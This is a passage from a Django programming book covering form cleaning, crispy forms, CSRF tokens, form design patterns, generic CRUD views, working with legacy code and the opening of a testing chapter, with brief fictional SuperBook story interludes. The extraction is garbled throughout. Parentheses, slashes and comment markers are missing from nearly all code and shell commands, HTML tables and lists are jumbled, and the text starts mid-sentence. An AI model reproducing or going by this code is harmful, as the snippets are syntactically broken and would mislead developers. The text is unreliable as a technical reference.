Hexa as she dropped the  car. "Yeah, please get me out of here," Steve begged.  Why does data need cleaning? Eventually, you need to get the "cleaned data" from the form. Does this mean that the  values that the user had entered were not clean? Yes, for two reasons.  [ 607 ]  Chapter 7   First, anything that comes from the outside world should not be trusted initially.  Malicious users can enter all sorts of exploits through a form that can undermine   the security of your site. So, any form data must be sanitized before you use them.  Best Practice Never trust the user input.  Secondly, the field values in request.POST or request.GET are just strings. Even  if your form field can be defined as an integer  say, age  or date  say, birthday , the  browser would send them as strings to your view. Invariably, you would like to  convert them to the appropriate Python types before use. The form class does this  conversion automatically for you while cleaning.  Let's see this in action:  >>> fill = {"name": "Blitz", "age": "30"}  >>> g = PersonDetailsForm fill   >>> g.is_valid    True  >>> g.cleaned_data  {'age': 30, 'name': 'Blitz'}  >>> type g.cleaned_data["age"]   int  The age value was passed as a string  possibly, from request.POST  to the form  class. After validation, the cleaned data contains the age in the integer form. This   is exactly what you would expect. Forms try to abstract away the fact that strings   are passed around and give you clean Python objects that you can use.  Displaying forms Django forms also help you create an HTML representation of your form. They  support three different representations: as_p  as paragraph tags , as_ul  as  unordered list items , and as_table  as, unsurprisingly, a table .  [ 608 ]  Forms   The template code, generated HTML code, and browser rendering for each of these  representations have been summarized in the following table:  Template {{ form.as_p }}  Code  Output in Browser  {{ form.as_ul }}  {{ form.as_table }}      Name:  <input class="textinput  textInput form- control" id="id_name"  maxlength="100" name="name"  type="text"  >   <label for="id_ age">Age:  <input  class="numberinput form- control" id="id_age"  name="age" type="number"   >   <label for="id_ name">Name:  <input  class="textinput textInput  form-control" id="id_name"  maxlength="100" name="name"  type="text"  >   <label for="id_ age">Age:  <input  class="numberinput form- control" id="id_age"  name="age" type="number"   >    <label  for="id_name">Name:<  label>  <input  class="textinput textInput  form-control" id="id_name"  maxlength="100" name="name"  type="text"  >     <label  for="id_age">Age:<  label>  <input  class="numberinput form- control" id="id_age"  name="age" type="number"   >    [ 609 ]  Chapter 7   Notice that the HTML representation gives only the form fields. This makes it   easier to include multiple Django forms in a single HTML form. However, this   also means that the template designer has a fair bit of boilerplate to write for each  form, as shown in the following code:      {% csrf_token %}    {{ form.as_table }}         Note that to make the HTML representation complete, you need to add the  surrounding form tags, a CSRF token, the table or ul tags, and the submit button.  Time to be crisp It can get tiresome to write so much boilerplate for each form in your templates.   The django-crispy-forms package makes writing the form template code more  crisp  in the sense of short . It moves all the presentation and layout into the   Django form itself. This way, you can write more Python code and less HTML.  The following table shows that the crispy form template tag generates a more  complete form, and the appearance is much more native to the Bootstrap style:  Template {% crispy form %}  Code  Output in Browser    <input type='hidden'  name='csrfmiddlewaretoken'  value='...'  > <div id="div_id_name"  class="form-group"> <label for="id_name"  class="control-label   requiredField"> Name<span  class="asteriskField">*<  span>    <input class="textinput  textInput form-control  form-control" id="id_name"  maxlength="100" name="name"  type="text"  >    ...   HTML truncated for brevity   [ 610 ]  Forms   So, how do you get crisper forms? You will need to install the django-crispy- forms package and add it to your INSTALLED_APPS. If you use Bootstrap 3, then you  will need to mention this in your settings:  CRISPY_TEMPLATE_PACK = "bootstrap3"  The form initialization will need to mention a helper attribute of the type  FormHelper. The following code is intended to be minimal and uses the default  layout:  from crispy_forms.helper import FormHelper from crispy_forms.layout import Submit  class PersonDetailsForm forms.Form :     name = forms.CharField max_length=100      age = forms.IntegerField        def __init__ self, *args, **kwargs :         super  .__init__ *args, **kwargs          self.helper = FormHelper self          self.helper.layout.append Submit 'submit', 'Submit'    Understanding CSRF So, you must have noticed something called a CSRF token in the form templates.  What does it do? It is a security mechanism against Cross-Site Request Forgery   CSRF  attacks for your forms.  It works by injecting a server-generated random string called a CSRF token, unique  to a user's session. Every time a form is submitted, it must have a hidden field that  contains this token. This token ensures that the form was generated for the user by  the original site, rather than a fake form created by an attacker with similar fields.  CSRF tokens are not recommended for forms using the GET method because the   GET actions should not change the server state. Moreover, forms submitted via GET  would expose the CSRF token in the URLs. Since URLs have a higher risk of being  logged or shoulder-sniffed, it is better to use CSRF in forms using the POST method.  [ 611 ]  Chapter 7   Form processing with Class-based views We can essentially process a form by subclassing the Class-based view itself:  class ClassBasedFormView generic.View :     template_name = 'form.html'      def get self, request :         form = PersonDetailsForm           return render request, self.template_name, {'form': form}       def post self, request :         form = PersonDetailsForm request.POST          if form.is_valid  :              Success! We can use form.cleaned_data now             return redirect 'success'          else:              Invalid form! Reshow the form with error highlighted             return render request, self.template_name,                           {'form': form}   Compare this code with the sequence diagram that we saw previously. The three  scenarios have been separately handled. Every form is expected to follow the Post Redirect Get  PRG  pattern. If the  submitted form is found to be valid, then it must issue a redirect. This prevents  duplicate form submissions.  However, this is not a very DRY code. The form class name and template name  attributes have been repeated. Using a generic class-based view such as FormView  can reduce the redundancy of form processing. The following code will give you   the same functionality as the previous one in fewer lines of code:  from django.core.urlresolvers import reverse_lazy  class GenericFormView generic.FormView :     template_name = 'form.html'     form_class = PersonDetailsForm     success_url = reverse_lazy "success"   We need to use reverse_lazy in this case because the URL patterns are not loaded  when the view file is imported.  [ 612 ]  Forms   Form patterns Let's take a look at some of the common patterns when working with forms.  Pattern – dynamic form generation Problem: Adding form fields dynamically or changing form fields from what   has been declared. Solution: Add or change fields during initialization of the form.  Problem details Forms are usually defined in a declarative style with form fields listed as class   fields. However, sometimes we do not know the number or type of these   fields in advance. This calls for the form to be dynamically generated. This   pattern is sometimes called Dynamic Forms or Runtime form generation. Imagine a flight passenger check-in system, which allows for the upgrade of  economy class tickets to first class. If there are any first-class seats left, there needs   to be an additional option to the user if they would like to fly first class. However,   this optional field cannot be declared since it will not be shown to all users.   Such dynamic forms can be handled by this pattern.  Solution details Every form instance has an attribute called fields, which is a dictionary that   holds all the form fields. This can be modified at runtime. Adding or changing   the fields can be done during form initialization itself.  For example, if we need to add a checkbox to a user details form only if a keyword  argument named "upgrade" is true at form initialization, then we can implement it   as follows:  class PersonDetailsForm forms.Form :     name = forms.CharField max_length=100      age = forms.IntegerField        def __init__ self, *args, **kwargs :         upgrade = kwargs.pop "upgrade", False   [ 613 ]  Chapter 7           super  .__init__ *args, **kwargs            Show first class option?         if upgrade:             self.fields["first_class"] = forms.BooleanField                  label="Fly First Class?"   Now, we just need to pass the, PersonDetailsForm upgrade=True  keyword  argument to make an additional Boolean input field   a checkbox  appear.  Note that a newly introduced keyword argument has to be removed or  popped before we call super to avoid the unexpected keyword error.  If we use a FormView class for this example, then we need to pass the keyword  argument by overriding the get_form_kwargs method of the view class, as shown   in the following code:  class PersonDetailsEdit generic.FormView :     ...      def get_form_kwargs self :         kwargs = super  .get_form_kwargs           kwargs["upgrade"] = True         return kwargs  This pattern can be used to change any attribute of a field at runtime, such as its  widget or help text. It works for model forms as well.  In many cases, a seeming need for dynamic forms can be solved using Django  formsets. They are used when a form needs to be repeated in a page. A typical use  case for formsets is while designing a data grid-like view to add elements row by  row. This way, you do not need to create a dynamic form with an arbitrary number  of rows. You just need to create a form for the row and create multiple rows using   a formset_factory function.  Pattern – user-based forms Problem: Forms need to be customized based on the logged-in user. Solution: Pass the logged-in user as a keyword argument to the form's initializer.  [ 614 ]  Forms   Problem details A form can be presented in different ways based on the user. Certain users might  not need to fill all the fields, while certain others might need to add additional  information. In some cases, you might need to run some checks on the user's  eligibility, such as verifying whether they are members of a group, to determine   how the form should be constructed.  Solution details As you must have noticed, you can solve this using the solution given in the  Dynamic form generation pattern. You just need to pass request.user as a   keyword argument to the form. However, we can also use mixins from the   django-braces package for a shorter and more reusable solution.  As in the previous example, we need to show an additional checkbox to the user.  However, this will be shown only if the user is a member of the VIP group. Let's  take a look at how PersonDetailsForm gets simplified with the form mixin  UserKwargModelFormMixin from django-braces:  from braces.forms import UserKwargModelFormMixin  class PersonDetailsForm UserKwargModelFormMixin, forms.Form :     ...      def __init__ self, *args, **kwargs :         super  .__init__ *args, **kwargs            Are you a member of the VIP group?         if self.user.groups.filter name="VIP" .exists  :             self.fields["first_class"] = forms.BooleanField                  label="Fly First Class?"   Notice how self.user was automatically made available by the mixin by popping  the user keyword argument.  Corresponding to the form mixin, there is a view mixin called  UserFormKwargsMixin, which needs to be added to the view, along with  LoginRequiredMixin to ensure that only logged-in users can access this view:  class VIPCheckFormView LoginRequiredMixin, UserFormKwargsMixin,  generic.FormView :     form_class = PersonDetailsForm     ...  [ 615 ]  Chapter 7   Now, the user argument will be passed to the PersonDetailsForm   form automatically.  Do check out other form mixins in django-braces such as  FormValidMessageMixin, which are readymade solutions to common   form-usage patterns.  Pattern – multiple form actions per view Problem: Handling multiple form actions in a single view or page. Solution: Forms can use separate views to handle form submissions or a single   view can identify the form based on the Submit button's name.  Problem details Django makes it relatively straightforward to combine multiple forms with the same  action, for example, a single submit button. However, most web pages need to show  several actions on the same page. For example, you might want the user to subscribe  or unsubscribe from a newsletter in two distinct forms on the same page.  However, Django's FormView is designed to handle only one form per view scenario.  Many other generic class-based views also share this assumption.  Solution details There are two ways to handle multiple forms: a separate view and single view.   Let's take a look at the first approach. Separate views for separate actions This is a fairly straightforward approach with each form specifying different   views as their actions. For example, take the subscribe and unsubscribe forms.   There can be two separate view classes to handle just the POST method from   their respective forms. Same view for separate actions Perhaps you find the splitting views to handle forms to be unnecessary, or you   find handling logically related forms in a common view to be more elegant. Either  way, we can work around the limitations of generic class-based views to handle  more than one form.  [ 616 ]  Forms   While using the same view class for multiple forms, the challenge is to identify  which form issued the POST action. Here, we take advantage of the fact that the   name and value of the Submit button is also submitted. If the Submit button is  named uniquely across forms, then the form can be identified while processing.  Here, we define a subscribe form using crispy forms so that we can name the submit  button as well:  class SubscribeForm forms.Form :     email = forms.EmailField        def __init__ self, *args, **kwargs :         super  .__init__ *args, **kwargs          self.helper = FormHelper self          self.helper.layout.append Submit 'subscribe_butn',  'Subscribe'    The UnSubscribeForm unsubscribe form class is defined in exactly the same way   and hence is, omitted , except that its Submit button is named unsubscribe_butn.  Since FormView is designed for a single form, we will use a simpler class-based view  say, TemplateView, as the base for our view. Let's take a look at the view definition  and the get method:  from .forms import SubscribeForm, UnSubscribeForm  class NewsletterView generic.TemplateView :     subcribe_form_class = SubscribeForm     unsubcribe_form_class = UnSubscribeForm     template_name = "newsletter.html"      def get self, request, *args, **kwargs :         kwargs.setdefault "subscribe_form", self.subcribe_form_ class            kwargs.setdefault "unsubscribe_form", self.unsubcribe_form_ class            return super  .get request, *args, **kwargs   The keyword arguments to a TemplateView class get conveniently inserted into the  template context. We create instances of either form only if they don't already exist,  with the help of the setdefault dictionary method. We will soon see why.  [ 617 ]  Chapter 7   Next, we will take a look at the POST method, which handles submissions from   either form:      def post self, request, *args, **kwargs :         form_args = {             'data': self.request.POST,             'files': self.request.FILES,         }         if "subscribe_butn" in request.POST:             form = self.subcribe_form_class **form_args              if not form.is_valid  :                 return self.get request,                                    subscribe_form=form              return redirect "success_form1"          elif "unsubscribe_butn" in request.POST:             form = self.unsubcribe_form_class **form_args              if not form.is_valid  :                 return self.get request,                                    unsubscribe_form=form              return redirect "success_form2"          return super  .get request   First, the form keyword arguments, such as data and files, are populated in a  form_args dictionary. Next, the presence of the first form's Submit button is checked  in request.POST. If the button's name is found, then the first form is instantiated.  If the form fails validation, then the response created by the GET method with the  first form's instance is returned. In the same way, we look for the second forms  submit button to check whether the second form was submitted.  Instances of the same form in the same view can be implemented in the same   way with form prefixes. You can instantiate a form with a prefix argument such   as SubscribeForm prefix="offers" . Such an instance will prefix all its form  fields with the given argument, effectively working like a form namespace.  Pattern – CRUD views Problem: Writing boilerplate for CRUD interfaces to a model is repetitive. Solution: Use generic class-based editing views.  [ 618 ]  Forms   Problem details In most web applications, about 80 percent of the time is spent writing, creating,  reading, updating, and deleting  CRUD  interfaces to a database. For instance,   Twitter essentially involves creating and reading each other's tweets. Here, a   tweet would be the database object that is being manipulated and stored.  Writing such interfaces from scratch can get tedious. This pattern can be easily  managed if CRUD interfaces can be automatically created from the model class itself.  Solution details Django simplifies the process of creating CRUD views with a set of four generic  class-based views. They can be mapped to their corresponding operations as follows:     CreateView: This view displays a blank form to create a new object    DetailView: This view shows an object's details by reading from the      UpdateView: This view allows to update an object's details through a       DeleteView: This view displays a confirmation page and, on approval,   database  pre-populated form  deletes the object  Let's take a look at a simple example. We have a model that contains important  dates, which are of interest to everyone using our site. We need to build simple  CRUD interfaces so that anyone can view and modify these dates. Let's take a   look at the ImportantDate model itself:   models.py class ImportantDate models.Model :     date = models.DateField       desc = models.CharField max_length=100       def get_absolute_url self :         return reverse 'impdate_detail', args=[str self.pk ]   The get_absolute_url   method is used by the CreateView and UpdateView  classes to redirect after a successful object creation or update. It has been routed to  the object's DetailView.  [ 619 ]  Chapter 7   The CRUD views themselves are simple enough to be self-explanatory, as shown in  the following code:   views.py from django.core.urlresolvers import reverse_lazy  from . import forms  class ImpDateDetail generic.DetailView :     model = models.ImportantDate  class ImpDateCreate generic.CreateView :     model = models.ImportantDate     form_class = forms.ImportantDateForm  class ImpDateUpdate generic.UpdateView :     model = models.ImportantDate     form_class = forms.ImportantDateForm  class ImpDateDelete generic.DeleteView :     model = models.ImportantDate     success_url = reverse_lazy "impdate_list"   In these generic views, the model class is the only mandatory member to be  mentioned. However, in the case of DeleteView, the success_url function needs   to be mentioned as well. This is because after deletion get_absolute_url cannot   be used anymore to find out where to redirect users.  Defining the form_class attribute is not mandatory. If it is omitted, a ModelForm  method corresponding to the specified model will be created. However, we would  like to create our own model form to take advantage of crispy forms, as shown in   the following code:   forms.py from django import forms from . import models from crispy_forms.helper import FormHelper from crispy_forms.layout import Submit   class ImportantDateForm forms.ModelForm :     class Meta:         model = models.ImportantDate         fields = ["date", "desc"]      def __init__ self, *args, **kwargs :  [ 620 ]  Forms           super  .__init__ *args, **kwargs           self.helper = FormHelper self          self.helper.layout.append Submit 'save', 'Save'    Thanks to crispy forms, we need very little HTML markup in our templates to build  these CRUD forms.  Note that explicitly mentioning the fields of a ModelForm method is a  best practice and will soon become mandatory in future releases.  The template paths, by default, are based on the view class and the model names.   For brevity, we omitted the template source here. Note that we can use the same  form for CreateView and UpdateView.  Finally, we take a look at urls.py, where everything is wired up together:  url r'^impdates create $',     pviews.ImpDateCreate.as_view  , name="impdate_create" , url r'^impdates  ?P \d+  $',     pviews.ImpDateDetail.as_view  , name="impdate_detail" , url r'^impdates  ?P \d+  update $',     pviews.ImpDateUpdate.as_view  , name="impdate_update" , url r'^impdates  ?P \d+  delete $',     pviews.ImpDateDelete.as_view  , name="impdate_delete" ,  Django generic views are a great way to get started with creating CRUD views for  your models. With a few lines of code, you get well-tested model forms and views  created for you, rather than doing the boring task yourself.  Summary In this chapter, we looked at how web forms work and how they are abstracted  using form classes in Django. We also looked at the various techniques and   patterns to save time while working with forms.  In the next chapter, we will take a look at a systematic approach to work with a   legacy Django codebase, and how we can enhance it to meet evolving client needs.  [ 621 ]  Chapter 7    Dealing with Legacy Code  In this chapter, we will discuss the following topics:     Reading a Django code base    Discovering relevant documentation       Writing tests before changing code    Legacy database integration  Incremental changes versus full rewrites  It sounds exciting when you are asked to join a project. Powerful new tools and  cutting-edge technologies might await you. However, quite often, you are asked   to work with an existing, possibly ancient, codebase.  To be fair, Django has not been around for that long. However, projects written  for older versions of Django are sufficiently different to cause concern. Sometimes,  having the entire source code and documentation might not be enough.  If you are asked to recreate the environment, then you might need to fumble with   the OS configuration, database settings, and running services locally or on the  network. There are so many pieces to this puzzle that you might wonder how   and where to start.  Understanding the Django version used in the code is a key piece of information. As  Django evolved, everything from the default project structure to the recommended  best practices have changed. Therefore, identifying which version of Django was  used is a vital piece in understanding it.  [ 623 ]   Change of Guards Sitting patiently on the ridiculously short beanbags in the training  room, the SuperBook team waited for Hart. He had convened an  emergency go-live meeting. Nobody understood the "emergency" part  since go live was at least 3 months away. Madam O rushed in holding a large designer coffee mug in one hand  and a bunch of printouts of what looked like project timelines in the  other. Without looking up she said, "We are late so I will get straight  to the point. In the light of last week's attacks, the board has decided to  summarily expedite the SuperBook project and has set the deadline to  end of next month. Any questions?" "Yeah," said Brad, "Where is Hart?" Madam O hesitated and replied,  "Well, he resigned. Being the head of IT security, he took moral  responsibility of the perimeter breach." Steve, evidently shocked,  was shaking his head. "I am sorry," she continued, "But I have been  assigned to head SuperBook and ensure that we have no roadblocks to  meet the new deadline." There was a collective groan. Undeterred, Madam O took one of the  sheets and began, "It says here that the Remote Archive module is  the most high-priority item in the incomplete status. I believe Evan is  working on this." "That's correct," said Evan from the far end of the room. "Nearly  there," he smiled at others, as they shifted focus to him. Madam O  peered above the rim of her glasses and smiled almost too politely.  "Considering that we already have an extremely well-tested and  working Archiver in our Sentinel code base, I would recommend that  you leverage that instead of creating another redundant system." "But," Steve interrupted, "it is hardly redundant. We can improve over  a legacy archiver, can't we?" "If it isn't broken, then don't fix it", replied  Madam O tersely. He said, "He is working on it," said Brad almost  shouting, "What about all that work he has already finished?" "Evan, how much of the work have you completed so far?" asked O,  rather impatiently. "About 12 percent," he replied looking defensive.  Everyone looked at him incredulously. "What? That was the hardest 12  percent" he added. O continued the rest of the meeting in the same pattern. Everybody's  work was reprioritized and shoe-horned to fit the new deadline. As   she picked up her papers, readying to leave she paused and removed  her glasses.   [ 624 ]  Dealing with Legacy Code   "I know what all of you are thinking... literally. But you need to know  that we had no choice about the deadline. All I can tell you now is that  the world is counting on you to meet that date, somehow or other."  Putting her glasses back on, she left the room. "I am definitely going to bring my tinfoil hat," said Evan loudly   to himself.  Finding the Django version Ideally, every project will have a requirements.txt or setup.py file at the root  directory, and it will have the exact version of Django used for that project. Let's   look for a line similar to this:  Django==1.5.9  Note that the version number is exactly mentioned  rather than Django>=1.5.9 ,  which is called pinning. Pinning every package is considered a good practice since   it reduces surprises and makes your build more deterministic.  Unfortunately, there are real-world codebases where the requirements.txt file was  not updated or even completely missing. In such cases, you will need to probe for  various tell-tale signs to find out the exact version.  Activating the virtual environment In most cases, a Django project would be deployed within a virtual environment.  Once you locate the virtual environment for the project, you can activate it by  jumping to that directory and running the activated script for your OS. For Linux,  the command is as follows:  $ source venv_path bin activate  Once the virtual environment is active, start a Python shell and query the Django  version as follows:  $ python  >>> import django  >>> print django.get_version     1.5.9  The Django version used in this case is Version 1.5.9.  [ 625 ]  Chapter 8   Alternatively, you can run the manage.py script in the project to get a similar output:  $ python manage.py --version  1.5.9  However, this option would not be available if the legacy project source snapshot  was sent to you in an undeployed form. If the virtual environment  and packages   was also included, then you can easily locate the version number  in the form of a  tuple  in the __init__.py file of the Django directory. For example:  $ cd envs foo_env lib python2.7 site-packages django   $ cat __init__.py  VERSION =  1, 5, 9, 'final', 0   ...  If all these methods fail, then you will need to go through the release notes of   the past Django versions to determine the identifiable changes  for example, the   AUTH_PROFILE_MODULE setting was deprecated since Version 1.5  and match them   to your legacy code. Once you pinpoint the correct Django version, then you can  move on to analyzing the code.  Where are the files? This is not PHP One of the most difficult ideas to get used to, especially if you are from the PHP  or ASP.NET world, is that the source files are not located in your web server's  document root directory, which is usually named wwwroot or public_html.  Additionally, there is no direct relationship between the code's directory structure  and the website's URL structure.   In fact, you will find that your Django website's source code is stored in an obscure  path such as  opt webapps my-django-app. Why is this? Among many good  reasons, it is often more secure to move your confidential data outside your public  webroot. This way, a web crawler would not be able to accidentally stumble into  your source code directory. As you would read in the Chapter 11, Production-ready the location of the source code  can be found by examining your web server's configuration file. Here, you will find  either the environment variable DJANGO_SETTINGS_MODULE being set to the module's  path, or it will pass on the request to a WSGI server that will be configured to point  to your project.wsgi file.  [ 626 ]  Dealing with Legacy Code   Starting with urls.py Even if you have access to the entire source code of a Django site, figuring out  how it works across various apps can be daunting. It is often best to start from the  root urls.py URLconf file since it is literally a map that ties every request to the  respective views.  With normal Python programs, I often start reading from the start of its   execution—say, from the top-level main module or wherever the __main__ check  idiom starts. In the case of Django applications, I usually start with urls.py since   it is easier to follow the flow of execution based on various URL patterns a site has.  In Linux, you can use the following find command to locate the settings.py file  and the corresponding line specifying the root urls.py:  $ find . -iname settings.py -exec grep -H 'ROOT_URLCONF' {} \;  . projectname settings.py:ROOT_URLCONF = 'projectname.urls'  $ ls projectname urls.py  projectname urls.py  Jumping around the code Reading code sometimes feels like browsing the web without the hyperlinks. When  you encounter a function or variable defined elsewhere, then you will need to jump  to the file that contains that definition. Some IDEs can do this automatically for you  as long as you tell it which files to track as part of the project.  If you use Emacs or Vim instead, then you can create a TAGS file to quickly navigate  between files. Go to the project root and run a tool called Exuberant Ctags as follows:  find . -iname "*.py" -print  etags -  This creates a file called TAGS that contains the location information, where every  syntactic unit such as classes and functions are defined. In Emacs, you can find the  definition of the tag, where your cursor  or point as it called in Emacs  is at using   the M-. command.  While using a tag file is extremely fast for large code bases, it is quite basic and is  not aware of a virtual environment  where most definitions might be located . An  excellent alternative is to use the elpy package in Emacs. It can be configured to  detect a virtual environment. Jumping to a definition of a syntactic element is using  the same M-. command. However, the search is not restricted to the tag file. So, you  can even jump to a class definition within the Django source code seamlessly.  [ 627 ]  Chapter 8   Understanding the code base It is quite rare to find legacy code with good documentation. Even if you do, the  documentation might be out of sync with the code in subtle ways that can lead to  further issues. Often, the best guide to understand the application's functionality   is the executable test cases and the code itself.  The official Django documentation has been organized by versions at https:  docs. djangoproject.com. On any page, you can quickly switch to the corresponding page  in the previous versions of Django with a selector on the bottom right-hand section of  the page:     [ 628 ]  Dealing with Legacy Code   In the same way, documentation for any Django package hosted on readthedocs. org can also be traced back to its previous versions. For example, you can select  the documentation of django-braces all the way back to v1.0.0 by clicking on the  selector on the bottom left-hand section of the page:  Creating the big picture Most people find it easier to understand an application if you show them a   high-level diagram. While this is ideally created by someone who understands   the workings of the application, there are tools that can create very helpful   high-level depiction of a Django application.  [ 629 ]  Chapter 8   A graphical overview of all models in your apps can be generated by   the graph_models management command, which is provided by the   django-command-extensions package. As shown in the following diagram,   the model classes and their relationships can be understood at a glance:  Model classes used in the SuperBook project connected by arrows indicating their relationships  This visualization is actually created using PyGraphviz. This can get really large   for projects of even medium complexity. Hence, it might be easier if the applications  are logically grouped and visualized separately.  [ 630 ]  Dealing with Legacy Code   PyGraphviz Installation and Usage If you find the installation of PyGraphviz challenging, then don't  worry, you are not alone. Recently, I faced numerous issues while  installing on Ubuntu, starting from Python 3 incompatibility to  incomplete documentation. To save your time, I have listed the steps  that worked for me to reach a working setup. On Ubuntu, you will need the following packages installed to install  PyGraphviz: $ sudo apt-get install python3.4-dev graphviz  libgraphviz-dev pkg-config Now activate your virtual environment and run pip to install the  development version of PyGraphviz directly from GitHub, which  supports Python 3: $ pip install git+http:  github.com pygraphviz  pygraphviz.gitegg=pygraphviz Next, install django-extensions and add it to your INSTALLED_ APPS. Now, you are all set. Here is a sample usage to create a GraphViz dot file for just two apps  and to convert it to a PNG image for viewing:  $ python manage.py graph_models app1 app2 > models.dot $ dot -Tpng models.dot -o models.png  Incremental change or a full rewrite? Often, you would be handed over legacy code by the application owners in the  earnest hope that most of it can be used right away or after a couple of minor   tweaks. However, reading and understanding a huge and often outdated code   base is not an easy job. Unsurprisingly, most programmers prefer to work on  greenfield development.  In the best case, the legacy code ought to be easily testable, well documented,   and flexible to work in modern environments so that you can start making  incremental changes in no time. In the worst case, you might recommend   discarding the existing code and go for a full rewrite. Or, as it is commonly decided,  the short-term approach would be to keep making incremental changes, and a  parallel long-term effort might be underway for a complete reimplementation.  [ 631 ]  Chapter 8   A general rule of thumb to follow while taking such decisions is—if the cost of  rewriting the application and maintaining the application is lower than the cost of  maintaining the old application over time, then it is recommended to go for a rewrite.  Care must be taken to account for all the factors, such as time taken to get new  programmers up to speed, the cost of maintaining outdated hardware, and so on.  Sometimes, the complexity of the application domain becomes a huge barrier against  a rewrite, since a lot of knowledge learnt in the process of building the older code  gets lost. Often, this dependency on the legacy code is a sign of poor design in the  application like failing to externalize the business rules from the application logic.  The worst form of a rewrite you can probably undertake is a conversion, or a  mechanical translation from one language to another without taking any advantage  of the existing best practices. In other words, you lost the opportunity to modernize  the code base by removing years of cruft.  Code should be seen as a liability not an asset. As counter-intuitive as it might  sound, if you can achieve your business goals with a lesser amount of code, you   have dramatically increased your productivity. Having less code to test, debug,   and maintain can not only reduce ongoing costs but also make your organization  more agile and flexible to change.  Code is a liability not an asset. Less code is more maintainable.  Irrespective of whether you are adding features or trimming your code, you must  not touch your working legacy code without tests in place.  Write tests before making any changes In the book Working Effectively with Legacy Code, Michael Feathers defines legacy   code as, simply, code without tests. He elaborates that with tests one can easily  modify the behavior of the code quickly and verifiably. In the absence of tests, it   is impossible to gauge if the change made the code better or worse.  Often, we do not know enough about legacy code to confidently write a test.   Michael recommends writing tests that preserve and document the existing   behavior, which are called characterization tests.  [ 632 ]  Dealing with Legacy Code   Unlike the usual approach of writing tests, while writing a characterization test,   you will first write a failing test with a dummy output, say X, because you don't  know what to expect. When the test harness fails with an error, such as "Expected  output X but got Y", then you will change your test to expect Y. So, now the test   will pass, and it becomes a record of the code's existing behavior.  Note that we might record buggy behavior as well. After all, this is unfamiliar code.  Nevertheless, writing such tests are necessary before we start changing the code.  Later, when we know the specifications and code better, we can fix these bugs and  update our tests  not necessarily in that order .  Step-by-step process to writing tests Writing tests before changing the code is similar to erecting scaffoldings before   the restoration of an old building. It provides a structural framework that helps   you confidently undertake repairs.  You might want to approach this process in a stepwise manner as follows:  1.   Identify the area you need to make changes to. Write characterization tests  focusing on this area until you have satisfactorily captured its behavior. 2.  Look at the changes you need to make and write specific test cases for    3.   those. Prefer smaller unit tests to larger and slower integration tests. Introduce incremental changes and test in lockstep. If tests break, then  try to analyze whether it was expected. Don't be afraid to break even the  characterization tests if that behavior is something that was intended   to change.  If you have a good set of tests around your code, then you can quickly find the   effect of changing your code.  On the other hand, if you decide to rewrite by discarding your code but not your  data, then Django can help you considerably.  Legacy databases There is an entire section on legacy databases in Django documentation and   rightly so, as you will run into them many times. Data is more important than   code, and databases are the repositories of data in most enterprises.  You can modernize a legacy application written in other languages or frameworks   by importing their database structure into Django. As an immediate advantage,   you can use the Django admin interface to view and change your legacy data.  [ 633 ]  Chapter 8   Django makes this easy with the inspectdb management command, which looks   as follows:  $ python manage.py inspectdb > models.py  This command, if run while your settings are configured to use the legacy database,  can automatically generate the Python code that would go into your models file.  Here are some best practices if you are using this approach to integrate to a   legacy database:     Know the limitations of Django ORM beforehand. Currently, multicolumn    composite  primary keys and NoSQL databases are not supported.     Don't forget to manually clean up the generated models, for example, remove   the redundant 'ID' fields since Django creates them automatically.     Foreign Key relationships may have to be manually defined. In some  databases, the auto-generated models will have them as integer fields   suffixed with _id .     Organize your models into separate apps. Later, it will be easier to add the   views, forms, and tests in the appropriate folders.     Remember that running the migrations will create Django's administrative   tables  django_* and auth_*  in the legacy database.  In an ideal world, your auto-generated models would immediately start working,  but in practice, it takes a lot of trial and error. Sometimes, the data type that Django  inferred might not match your expectations. In other cases, you might want to add  additional meta information such as unique_together to your model.  Eventually, you should be able to see all the data that was locked inside that aging  PHP application in your familiar Django admin interface. I am sure this will bring   a smile to your face.  Summary In this chapter, we looked at various techniques to understand legacy code. Reading  code is often an underrated skill. But rather than reinventing the wheel, we need   to judiciously reuse good working code whenever possible. In this chapter and the  rest of the book, we emphasize the importance of writing test cases as an integral  part of coding.  In the next chapter, we will talk about writing test cases and the often frustrating  task of debugging that follows.  [ 634 ]  Dealing with Legacy Code   Testing and Debugging  In this chapter, we will discuss the following topics:     Test-driven development    Dos and don'ts of writing tests    Mocking    Debugging    Logging  Every programmer must have, at least, considered skipping writing tests. In Django,  the default app layout has a tests.py module with some placeholder content. It is a  reminder that tests are needed. However, we are often tempted to skip it.  In Django, writing tests is quite similar to writing code. In fact, it is practically code.  So, the process of writing tests might seem like doubling  or even more  the effort  of coding. Sometimes, we are under so much time pressure that it might seem  ridiculous to spend time writing tests when we are just trying to make things work.  However, eventually, it is pointless to skip tests if you ever want anyone else to   use your code. Imagine that you invented an electric razor and tried to sell it to   your friend saying that it worked well for you, but you haven't tested it properly.  Being a good friend of yours he or she might agree, but imagine the horror if you  told this to a stranger.  [ 635 ]   Why write tests? Tests in a software check whether it works as expected. Without tests, you might   be able to say that your code works, but you will have no way to prove that it   works correctly.  Additionally, it is important to remember that it can be dangerous to omit unit testing  in Python because of its duck-typing nature. Unlike languages such as Haskell, type  checking cannot be strictly enforced at compile time. Unit tests, being run at runtime   although in a separate execution , are essential in Python development.  Writing tests can be a humbling experience. The tests will point out your mistakes  and you will get a chance to make an early course correction. In fact, there are some  who advocate writing tests before the code itself.  Test-driven development Test-driven development  TDD  is a form of software development where you first  write the test, run the test  which would fail first , and then write the minimum code  needed to make the test pass. This might sound counter-intuitive. Why do we need  to write tests when we know that we have not written any code and we are certain  that it will fail because of that?  However, look again. We do eventually write the code that merely satisfies these tests.  This means that these tests are not ordinary tests, they are more like specifications.  They tell you what to expect. These tests or specifications will directly come from   your client's user stories. You are writing just enough code to make it work.  The process of test-driven development has many similarities to the scientific  method, which is the basis of modern science. In the scientific method, it is   important to frame the hypothesis first, gather data, and then conduct experiments  that are repeatable and verifiable to prove or disprove your hypothesis.  My recommendation would be to try TDD once you are comfortable writing tests  for your projects. Beginners might find it difficult to frame a test case that checks  how the code should behave. For the same reasons, I wouldn't suggest TDD for  exploratory programming.  [ 636 ]  Testing and Debugging   Writing a test case There are different kinds of tests. However, at the minimum, a programmers need  to know unit tests since they have to be able to write them. Unit testing checks the  smallest testable part of an application. Integration testing checks whether these  parts work well with each other.  The word unit is the key term here. Just test one unit at a time. Let's take a look   at a simple example of a test case:   tests.py from django.test import TestCase from django.core.urlresolvers import resolve from .views import HomeView class HomePageOpenTestCase TestCase :     def test_home_page_resolves self :         view = resolve ' '          self.assertEqual view.func.__name__,                          HomeView.as_view  .__name__   This is a simple test that checks whether, when a user visits the root of our website's  domain, they are correctly taken to the 